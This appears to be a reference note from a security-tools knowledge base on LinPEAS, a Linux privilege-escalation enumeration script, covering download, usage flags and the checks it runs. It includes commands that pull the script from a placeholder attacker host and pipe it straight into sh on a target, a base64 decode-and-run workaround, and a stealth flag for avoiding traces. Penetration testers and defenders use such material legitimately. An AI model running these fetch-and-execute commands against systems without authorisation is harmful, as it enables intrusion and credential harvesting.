---
title: "linpeas"
category: "tool"
tags: ["privilege-escalation", "linux", "enumeration", "post-exploitation"]
sources:
  - type: github
    url: "https://github.com/peass-ng/PEASS-ng"
  - type: releases
    url: "https://github.com/peass-ng/PEASS-ng/releases/latest"
last_updated: "2025-12-27"
---

# linpeas

## Table of Contents

- [Overview](#overview)
- [Installation / Download](#installation--download)
- [Quick Start](#quick-start)
- [Key Checks](#key-checks)
- [Documentation Files](#documentation-files)

## Overview

LinPEAS (Linux Privilege Escalation Awesome Script) is a shell script that searches for possible local privilege escalation paths on Linux/Unix systems. It enumerates system information, checks for misconfigurations, and highlights potential vulnerabilities with color-coded output for easy identification.

Part of the PEASS-ng (Privilege Escalation Awesome Scripts SUITE) project.

## Installation / Download

### Download from GitHub Releases

```bash
# Download latest linpeas.sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Make executable
chmod +x linpeas.sh
```

### One-liner execution (no download)

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Quick Start

### Running on Target

```bash
# Basic execution
./linpeas.sh

# Quiet mode (less output)
./linpeas.sh -q

# Thorough mode (more checks, slower)
./linpeas.sh -a

# Save output to file
./linpeas.sh | tee linpeas_output.txt

# Specific checks only
./linpeas.sh -s    # Stealth mode (avoid leaving traces)
./linpeas.sh -e    # Extra enumeration
```

### Transferring to Target

```bash
# From attacker machine - start HTTP server
python3 -m http.server 8000

# On target - download and execute
curl http://ATTACKER_IP:8000/linpeas.sh | sh

# Alternative: wget
wget http://ATTACKER_IP:8000/linpeas.sh -O- | sh

# Via base64 (when curl/wget unavailable)
# Attacker: cat linpeas.sh | base64 -w0
# Target: echo "BASE64_STRING" | base64 -d | sh
```

## Key Checks

| Check Category | Description |
|----------------|-------------|
| System Information | OS version, kernel, hostname, network config |
| Users & Groups | Current user, sudo rights, interesting groups |
| SUID/SGID Binaries | Exploitable setuid/setgid executables |
| Capabilities | Files with dangerous Linux capabilities |
| Cron Jobs | Scheduled tasks, writable scripts |
| Services | Running processes, service configurations |
| Network | Open ports, connections, iptables rules |
| Software | Installed packages, outdated software |
| File Permissions | World-writable files, sensitive file access |
| Credentials | Passwords in configs, SSH keys, history files |
| Container Escape | Docker/LXC/Kubernetes breakout vectors |
| CVE Checks | Known kernel and software vulnerabilities |

## Documentation Files

| File | Description |
|------|-------------|
| [README.md](README.md) | This file - overview and quick reference |
| [official_docs.md](official_docs.md) | Detailed official documentation |

## References

- [GitHub Repository](https://github.com/peass-ng/PEASS-ng)
- [HackTricks Linux PrivEsc Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)
- [Releases Page](https://github.com/peass-ng/PEASS-ng/releases/latest)
